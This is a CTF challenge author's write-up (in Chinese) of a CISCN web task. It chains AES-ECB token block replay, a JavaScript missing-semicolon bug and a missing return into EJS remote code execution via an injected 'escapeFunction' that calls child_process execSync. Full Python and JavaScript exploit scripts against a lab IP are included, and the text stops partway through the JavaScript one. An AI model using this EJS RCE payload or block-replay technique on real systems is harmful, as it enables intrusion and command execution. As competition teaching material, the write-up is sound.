<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CISCN国赛东南赛区出题小记 - kdxcxs</title><meta name="Description" content="This is my cool site"><meta property="og:title" content="CISCN国赛东南赛区出题小记" />
<meta property="og:description" content="好久没写博客了，正好出题写了 wp，就放上来水一下吧。这次难度控制的不是很好，fix 很简单，但是攻击只有 1 解，不过希望师傅们游戏玩得开心。 拿到" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-26T09:09:47+08:00" />
<meta property="article:modified_time" content="2023-06-26T09:09:47+08:00" /><meta property="og:site_name" content="kdxcxs" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CISCN国赛东南赛区出题小记"/>
<meta name="twitter:description" content="好久没写博客了，正好出题写了 wp，就放上来水一下吧。这次难度控制的不是很好，fix 很简单，但是攻击只有 1 解，不过希望师傅们游戏玩得开心。 拿到"/>
<meta name="application-name" content="My cool site">
<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://kdxcxs.github.io/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" /><link rel="prev" href="https://kdxcxs.github.io/posts/cyber-security/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E6%8B%BF%E4%B8%8B%E5%AE%9D%E5%A1%94/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CISCN国赛东南赛区出题小记",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/kdxcxs.github.io\/posts\/wp\/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0\/"
        },"genre": "posts","keywords": "ctf, my-chals, ciscn, ejs","wordcount":  1971 ,
        "url": "https:\/\/kdxcxs.github.io\/posts\/wp\/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0\/","datePublished": "2023-06-26T09:09:47+08:00","dateModified": "2023-06-26T09:09:47+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "kdxcxs"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="kdxcxs">kdxcxs&#39; blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="选择语言">
                    <i class="fa fa-globe" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" selected>简体中文</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="kdxcxs">kdxcxs&#39; blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/posts/wp/ciscn%E5%9B%BD%E8%B5%9B%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" selected>简体中文</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CISCN国赛东南赛区出题小记</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>kdxcxs</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>ctf</a>&nbsp;<a href="/categories/my-chals/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>my-chals</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-26">2023-06-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1971 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id="busuanzi_container_page_pv">
                    <i class="far fa-eye fa-fw"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;次阅读
                </span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            </div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#websocket">websocket</a></li>
    <li><a href="#render">render</a>
      <ul>
        <li><a href="#换行缺少分号">换行缺少分号</a></li>
        <li><a href="#if-代码块内无-return">if 代码块内无 return</a></li>
      </ul>
    </li>
    <li><a href="#exp">exp</a></li>
    <li><a href="#patch">patch</a></li>
    <li><a href="#后记">后记</a>
      <ul>
        <li><a href="#ejs-中使用-import-进行-rce">ejs 中使用 import 进行 rce</a></li>
        <li><a href="#ejs-带回显-rce">ejs 带回显 rce</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><blockquote>
<p>好久没写博客了，正好出题写了 wp，就放上来水一下吧。这次难度控制的不是很好，fix 很简单，但是攻击只有 1 解，不过希望师傅们游戏玩得开心。</p>
</blockquote>
<p>拿到题目可以发现其实后端的代码并不复杂，<code>index.cjs</code> 中仅有两个接口，一个 websocket，一个 render：</p>
<h2 id="websocket">websocket</h2>
<p>跟进到 <code>ws.mjs</code> 中可以看到本题所有的接口都是通过 AES ECB 来进行身份验证的，或许可以考虑 ECB 重放攻击，但是现在似乎并不能直接使用，mark 一下。</p>
<p>继续看代码可以发现 <code>profilePayload</code> 接口有个很奇怪的东西：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/209c8d7f7d8c4f07a7949537d4f45cbc_MD5.png"
        data-srcset="../assets/209c8d7f7d8c4f07a7949537d4f45cbc_MD5.png, ../assets/209c8d7f7d8c4f07a7949537d4f45cbc_MD5.png 1.5x, ../assets/209c8d7f7d8c4f07a7949537d4f45cbc_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/209c8d7f7d8c4f07a7949537d4f45cbc_MD5.png"
        title="profilePayload接口" /></p>
<p>都不用原型链污染了，真贴心，但是我们并不能控制 <code>debug</code> 属性，仍然 mark，后面会用到</p>
<h2 id="render">render</h2>
<p>一来就是一个非常显眼的注释：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/e6fd56d193d763619128036038c033a2_MD5.png"
        data-srcset="../assets/e6fd56d193d763619128036038c033a2_MD5.png, ../assets/e6fd56d193d763619128036038c033a2_MD5.png 1.5x, ../assets/e6fd56d193d763619128036038c033a2_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/e6fd56d193d763619128036038c033a2_MD5.png"
        title="过期token" /></p>
<p>可以看到给了一个过期的 token，但是这道题是基于 AES ECB 的，不妨把数据对齐看看能不能重放：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/94008f91dacbbe59488b4a514888b7de_MD5.png"
        data-srcset="../assets/94008f91dacbbe59488b4a514888b7de_MD5.png, ../assets/94008f91dacbbe59488b4a514888b7de_MD5.png 1.5x, ../assets/94008f91dacbbe59488b4a514888b7de_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/94008f91dacbbe59488b4a514888b7de_MD5.png"
        title="token按照AES分块对齐" /></p>
<p>很明显最后两块是可以利用的，加上前面 websocket 的 <code>profilePayload</code> 接口我们可以往里面加任意属性，控制一下长度就可以构造 <code>debug == true</code> 了。</p>
<p>继续往后面看：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="../assets/e438f85b532b77d03e25dd1f71b0b570_MD5.png"
        data-srcset="../assets/e438f85b532b77d03e25dd1f71b0b570_MD5.png, ../assets/e438f85b532b77d03e25dd1f71b0b570_MD5.png 1.5x, ../assets/e438f85b532b77d03e25dd1f71b0b570_MD5.png 2x"
        data-sizes="auto"
        alt="../assets/e438f85b532b77d03e25dd1f71b0b570_MD5.png"
        title="js特性bug" /></p>
<p>这一段代码乍一看似乎没什么问题，但是短短几行代码就隐藏了两个 bug：</p>
<h3 id="换行缺少分号">换行缺少分号</h3>
<p>在 <code>data</code> 复制的地方可以看到第一行是没有分号的，代码本意是第一行将 <code>data</code> 赋值为一个数组，第二行通过布尔判断截断的方式打印提示，但是因为缺少分号，并且紧接的第二行是以 <code>[</code> 开头，这就会导致第二行的 <code>[decrypted.debug ? 0 : 1]</code> 变成第一行的取下标操作，最后 <code>data</code> 变量的值就会变成一个对象，而结合前面 <code>decrypted.debug</code> 已经可控，我们就可以控制让 <code>data</code> 变量被赋值为 <code>decrypted</code> 的值。</p>
<h3 id="if-代码块内无-return">if 代码块内无 return</h3>
<p>由于在前面写死了 <code>const env = 'production';</code> ，所以在这里检测 <code>env === 'production'</code> 的时候虽然似乎乍一看无解了，但是由于这里执行完成之后并没有 return，后面的代码其实还是会继续运行，也就是说 <code>data</code> 会被传入 <code>res.render</code> 函数进行渲染，而 <code>data</code> 变量可控，这就是一个很简单的 ejs rce了。</p>
<h2 id="exp">exp</h2>
<blockquote>
<p>注：两个 exp 的 payload 中都有一个很长的字符串，其实大可不必写这么长，空字符串其实都可以，反正前面已经构造好了，后面会被替换上去，有一个块就可以了，咱也不知道当时写 wp 的时候在想什么，反正能打通就行;-)</p>
</blockquote>
<p>python 版本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">websockets.sync.client</span> <span class="kn">import</span> <span class="n">connect</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.88.128:3000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ws_endpoint</span> <span class="o">=</span> <span class="n">endpoint</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;http&#34;</span><span class="p">,</span> <span class="s2">&#34;ws&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># test token</span>
</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;iat&#34;:150000000</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0000,&#34;exp&#34;:15999</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 99999999,&#34;name&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &#34;ciscn&#34;,&#34;debug&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># true}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># exp token</span>
</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;iat&#34;:16xxxxxxx</span>
</span></span><span class="line"><span class="cl"><span class="c1"># xxxx,&#34;exp&#34;:16xxx</span>
</span></span><span class="line"><span class="cl"><span class="c1"># xxxxxxxx,&#34;name&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &#34;exp&#34;,&#34;achieveme</span>
</span></span><span class="line"><span class="cl"><span class="c1"># nts&#34;:[],&#34;setting</span>
</span></span><span class="line"><span class="cl"><span class="c1"># s&#34;:{&#34;view option</span>
</span></span><span class="line"><span class="cl"><span class="c1"># s&#34;:{&#34;client&#34;:1,&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># escapeFunction&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &#34;0;return proces</span>
</span></span><span class="line"><span class="cl"><span class="c1"># s.mainModule.con</span>
</span></span><span class="line"><span class="cl"><span class="c1"># structor._load(&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># child_process&#39;).</span>
</span></span><span class="line"><span class="cl"><span class="c1"># execSync(&#39;/readf</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lag&gt;statics/flag</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &#39;)&#34;}},&#34;longStr&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &#34;ciscn&#34;,&#34;debug&#34;:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># true}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test_token</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s2">&#34;IK8FyUzqb7xjrpWnphEEY5d9814rMICbbGJxKM9Hy/niR0R00mHAoUfxp+5lYU7Pd5nXqPPBP9xlWPERsTe16jJnXLb9hYQ3PQbkkOUr8pA=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">connect</span><span class="p">(</span><span class="n">ws_endpoint</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;login&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;exp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;exp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;exp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}))</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">())[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;token&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;profilePayload&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;exp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;payload&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;settings&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;view options&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;client&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;escapeFunction&#34;</span><span class="p">:</span> <span class="s2">&#34;0;return process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;/readflag&gt;statics/flag&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;longStr&#34;</span><span class="p">:</span> <span class="s2">&#34;some_random_sting_just_to_make_sure_the_payload_is_long_enough_and_will_be_replaced_anyway&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}))</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">())[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;token&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">15</span> <span class="o">*</span> <span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">test_token</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span> <span class="o">+</span> <span class="s2">&#34;/profile&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span> <span class="o">+</span> <span class="s2">&#34;/flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><p>考虑到有的选手赛前并没有安装 python 的 websocket 相关库，本题目也可以使用 js 解答：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">endpoint</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.88.128:3000&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">wsEndpoint</span> <span class="o">=</span> <span class="nx">endpoint</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;ws&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">testToken</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;IK8FyUzqb7xjrpWnphEEY5d9814rMICbbGJxKM9Hy/niR0R00mHAoUfxp+5lYU7Pd5nXqPPBP9xlWPERsTe16jJnXLb9hYQ3PQbkkOUr8pA=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">wsEndpoint</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;login&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;login&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;exp&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}));</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;login&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">loginToken</span> <span class="o">=</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;profilePayload&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">token</span><span class="o">:</span> <span class="nx">loginToken</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">payload</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">settings</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;view options&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="nx">client</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                <span class="nx">escapeFunction</span><span class="o">:</span> <span class="s2">&#34;0;return process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;/readflag&gt;statics/flag&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                        <span class="p">},</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">longStr</span><span class="o">:</span> <span class="s2">&#34;some_random_sting_just_to_make_sure_the_payload_is_long_enough_and_will_be_replaced_anyway&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}));</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">payload</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">15</span><span class="p">)</span> <span class="o">+</span> <span class="nx">testToken</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">payload</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">endpoint</span><span class="si">}</span><span class="sb">/profile?token=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
